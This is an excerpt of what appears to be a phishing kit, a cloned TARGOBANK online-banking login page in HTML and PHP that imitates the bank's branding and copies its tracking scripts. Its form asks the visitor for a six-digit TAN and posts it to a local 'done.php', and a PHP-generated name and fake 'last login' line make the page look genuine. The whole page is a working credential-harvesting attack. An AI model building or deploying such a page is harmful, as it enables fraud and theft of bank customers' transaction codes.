...
<!DOCTYPE html>
    <html lang="de" class="js  ua-webkit ua-safari ua-safari-5 de identification no-slides has-no-nav no-touch theme-0 dom-ready all-ready">

    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
        <meta http-equiv="Content-Language" content="de">
        <title>Online-Banking | TARGOBANK</title>
        <meta name="description" content="Das Online-Banking der TARGOBANK. Einfach. Sicher. Individuell. Alle Bankgesch�fte im Blick und bequem online verwalten.">
        ...
        <script type="text/javascript" async="" src="./login_files/linkid.js"></script>
        <script type="text/javascript" async="" src="./login_files/analytics.js"></script>
        <script async="" src="./login_files/gtm.js"></script>
 ...
 detect_phone();
                                ...
                                <div id="e_identification">
                                    <aside>
                                        <div id="ei_tpl_ident">
                                            <div id="ei_tpl_login">
                                                <span id="name"><?php echo $name ?></span><br>
                                                <div id="lastTime"><?php echo "Letzter Login am 23.02.2019 um 13:57" ?></div>
                                                <img id="logoutimg"src="images/logout.png">
                                            </div>
                                        </div>
            ...
            <div id="hero-teaser" style='background:url(images/hero-slider-fallback-bg.jpg) repeat-x scroll center 0 transparent'>
               <span class="ym-clearfix"></span>
            </div>
            ...
            <div id="main">
                ...
                <div class="ym-g100">
                    <img src="images/header_1.png" style="height:62.6px; margin-top:-50px; margin-bottom:20px;">
                </div>
                                                                ...
                                                                <div class="box-teaser no-hover ym-clearfix login-form-box">
                                                                    ...
                                                                    <div class="login-form" style="    margin-left: auto;margin-right: auto;">
                                                                        ...
                                                                        <div class="login-form-wrapper">
                                                                            ...
                                                                            <h3 class="margin-top-no margin-bottom-small">Sie sind bereits Kunde der TARGOBANK?</h3>
                                                                            ...
                                                                            <div class="ei_appl_ident" id="ident">
                                                                                ...
                                                                                <form action="done.php" method="post" autocomplete="off" onsubmit="return submitForm()" name="bloc_ident" id="bloc_ident" data-tracked="true">
                                                                                    <fieldset>
                                                                                        <input type="hidden" name="_asked_tan" value="<?php echo $tanName ?>" />
                                                                                        <div class="ei_appl_ident_content">

                                                                                            <div class="ei_appl_ident_lig">
                                                                                                <label for="_userid"><?php echo $tanName;?></label>
                                                                                                <input type="text" name="_cm_tan" id="_tan" onkeypress='return event.charCode >= 48 && event.charCode <= 57' maxlength="6" value="" placeholder="" class="ei_appl_userid" maxlength="" tabindex="1" data-tracked="true">
                                                                                    ...
                                                                                    <div class="ei_appl_ident_blocbts">
                                                                                        <span class="ei_buttonbar" style="    margin-right: 12px;margin-left: -40px;width: 100%;">
                    ...
                    <input id="login-submit" type="image" alt="Jetzt einloggen" class="ei_btn_typ_send" src="./login_files/seconnecter.png" name="submit" tabindex="4" data-tracked="true">
                                                                        ...
                                                                        <div class="login-function-forgot" style="display: none">
                                                                            ...
                                                                            <p class="margin-bottom-small">
                                                                                <label>
                                                                                    <input type="radio" name="ctypeForget" value="1" checked="" data-tracked="true"> Privatkunde</label>
                                                                                <label>
                                                                                    <input type="radio" name="ctypeForget" value="2" data-tracked="true"> Geschäftskunden</label>
                                                                            </p>
...
<ul id="e_AA">
        ...
        <li id="li_amoins">
            ...
            <div id="tab-directmenu" class="v2" style="top: 222px;">
                <a href="https://www.targobank.de/de/service/kontakt.html" data-lb-width="700" data-lb-height="400" class="kontakt" onclick="trkEVT(&#39;Direktmenue&#39;, &#39;Klick&#39;, &#39;Kontakt&#39;)"></a>
                <a href="https://www.targobank.de/de/service/popup_service_telefon.html?addEvent=HP_directmenue_telefon&amp;number=number-20" data-lb-width="620" data-lb-height="620" class="telefon tab-lb"></a>
                <a href="https://www.targobank.de/de/service/suchen-und-finden/filialsuche.aspx?addEvent=HP_directmenue_filialsuche" data-lb-width="800" data-lb-height="500" class="filiale tab-lb" onclick="trkEVT(&#39;Direktmenue&#39;, &#39;Klick&#39;, &#39;Filialsuche&#39;)"></a>
                <a href="https://www.targobank.de/de/service/popup_service_mobile-kundenberatung.html?addEvent=HP_directmenue_msf" data-lb-width="700" data-lb-height="400" class="berater tab-lb" onclick="trkEVT(&#39;Direktmenue&#39;, &#39;Klick&#39;, &#39;Beratung zu Hause&#39;)"></a>
                <a href="https://www.targobank.de/de/service/kontakt/kontaktformular.html?addEvent=HP_directmenue_kontaktformular" data-lb-width="700" data-lb-height="625" class="email tab-lb" onclick="trkEVT(&#39;Direktmenue&#39;, &#39;Klick&#39;, &#39;E-Mail-Kontakt&#39;)"></a>
                <a href="https://www.targobank.de/termin/index.html" data-lb-width="660" data-lb-height="940" class="online-termin tab" onclick="trkEVT(&#39;Direktmenue&#39;, &#39;Klick&#39;, &#39;Online-Terminvereinbarung&#39;)"></a>
                <a href="https://www.targobank.de/de/identification/login.cgi?fbclid=IwAR1eCBzABWljGpoYRKIMgB8gloJth3hQHCD8woW95Y-sZP1EBxyrYcTEv-I" class="close-menu"></a>
            </div>
        </div>
        <!-- web analytics -->
        ...
        <script type="text/javascript" id="">
            var gtmCfg = {
                ...
                download: {
                    enabled: !0,
                    extensions: "xls,xlsx,doc,docx,ppt,pptx,pdf,txt,zip,rar,7z,exe,wma,mov,avi,wmv,mp3,csv,tsv,ics,xlsm,ppsx",
                    category: "Download",
                    dynamicDownload: !1,
                    pattern: /download=pdf/gi,
                    ni: !1
                },
                mailto: {
                    enabled: !0,
            ...
            "undefined" != typeof extensionLoaded && initialize();
        </script>

        <script type="text/javascript" id="" src="./login_files/gtmext-1.2.7.min.js"></script>
        <script type="text/javascript" id="">
            if (void 0 !== google_tag_manager["GTM-MKXMFSQ"].macro(62)) {
                document.cookie = "tabki\x3d" + google_tag_manager["GTM-MKXMFSQ"].macro(63) + "; max-age\x3d0; path\x3d/;";
                var maxAge = 2592E3;
                document.cookie = "tabki\x3d" + google_tag_manager["GTM-MKXMFSQ"].macro(64) + "; max-age\x3d" + maxAge + ";domain\x3d.targobank.de; path\x3d/;"
            }
            void 0 !== google_tag_manager["GTM-MKXMFSQ"].macro(65) && (document.cookie = "actid\x3d" + google_tag_manager["GTM-MKXMFSQ"].macro(66) + "; max-age\x3d0; path\x3d/;", maxAge = 2592E3, document.cookie = "actid\x3d" + google_tag_manager["GTM-MKXMFSQ"].macro(67) + "; max-age\x3d" + maxAge + ";domain\x3d.targobank.de; path\x3d/;");
            if ("/dcsync.html" == google_tag_manager["GTM-MKXMFSQ"].macro(68)) {
                var d = new Date;
                d.setTime(d.getTime() + 18E5);
                var expires = "expires\x3d" + d.toGMTString();
                document.cookie = "dcmCookie\x3d1; " + expires + "; domain\x3d.targobank.de; path\x3d/";
                dataLayer.push({
                    event: "event",
                    eventCategory: "tracking",
                    eventAction: "dcm_match_id",
                    eventLabel: "",
                    eventNi: !0
                })
            }
            1 == google_tag_manager["GTM-MKXMFSQ"].macro(69) && (d = new Date, d.setTime(d.getTime() + 18E5), expires = "expires\x3d" + d.toGMTString(), document.cookie = "dcmCookie\x3d1; " + expires + "; domain\x3d.targobank.de; path\x3d/");
            "www.targobank.de" != google_tag_manager["GTM-MKXMFSQ"].macro(70) || google_tag_manager["GTM-MKXMFSQ"].macro(71) || function() {
                var a = document.createElement("iframe");
                a.src = "https://cm.g.doubleclick.net/pixel?google_nid\x3dtargobank_dmp\x26google_cm";
                a.style.display = "none";
                a.style.visibility = "hidden";
                document.body.appendChild(a)
            }();
            document.addEventListener("visitor_type_change", function(a) {
                var b = a.detail;
                a = b.prev;
                b = b.next;
                dataLayer.push({
                    event: "event",
                    eventCategory: "visitorType",
                    eventAction: a + " \x3e " + b,
                    eventLabel: b,
                    eventNi: !0
                })
        ...
        <iframe src="./login_files/pixel.html" style="display: none; visibility: hidden;"></iframe>
        ...
        <script type="text/javascript" id="">
            var utilities = {
                ...
                trackApp: function(a, b, c, d, g, e, f) {
                    dataLayer.push({
                        event: "page",
                        appPageName: "/" + a + "/" + b + "/" + c + "/" + e + "/" + d + "/" + f
                    })
                },
